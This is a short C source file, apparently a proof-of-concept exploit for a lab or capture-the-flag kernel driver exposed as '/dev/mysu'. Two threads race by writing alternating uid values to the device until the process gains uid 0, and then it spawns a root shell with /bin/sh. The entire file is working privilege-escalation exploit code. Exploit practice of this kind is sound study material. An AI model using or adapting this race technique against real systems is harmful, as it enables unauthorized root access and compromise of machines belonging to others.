#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>

unsigned char user_val[] = { 0xe8, 0x03, 0x00, 0x00, 0xe0, 0xdf, 0x45, 0x1c };
//unsigned char user_val[] = { 0xe8, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

int flag = 0;

void *get_root(void *args) {
    int fd;

    while(!flag) {
        user_val[0] = 0x0;
        user_val[1] = 0x0;

        fd = open("/dev/mysu", O_RDWR);
        write(fd, user_val, sizeof(user_val));
        close(fd);

        if(getuid() == 0) {
            flag = 1;
            system("/bin/sh");
        }
    }
}

void *get_user(void *args) {
    int fd;

    while(!flag) {
        user_val[0] = 0xe8;
        user_val[1] = 0x03;

        fd = open("/dev/mysu", O_RDWR);
        write(fd, user_val, sizeof(user_val));
        close(fd);

        if(getuid() == 0) {
            flag = 1;
            system("/bin/sh");
        }
    }
}

int main(void) {

    pthread_t thread_root;
    pthread_t thread_user;

    pthread_create(&thread_root, NULL, get_root, NULL);
    pthread_create(&thread_user, NULL, get_user, NULL);

    pthread_join(thread_root, NULL);
    pthread_join(thread_user, NULL);

    return 0;
}
